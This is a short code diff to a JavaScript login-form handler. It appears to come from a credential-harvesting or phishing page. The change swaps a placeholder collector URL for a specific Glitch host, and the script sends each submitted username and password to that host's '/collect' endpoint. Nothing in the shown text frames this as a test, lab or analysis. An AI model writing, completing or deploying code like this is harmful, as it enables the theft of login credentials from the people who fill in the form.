@@ -6,7 +6,7 @@ document.getElementById('loginForm').addEventListener('submit', function(event) 
     const password = document.getElementById('password').value;
 
     // Replace this with your actual Glitch URL!
-    const endpoint = 'https://your-glitch-project-name.glitch.me/collect';
+    const endpoint = 'https://aware-flower-muenster.glitch.me/collect';
 
     // Send username and password to your backend
     fetch(endpoint, {
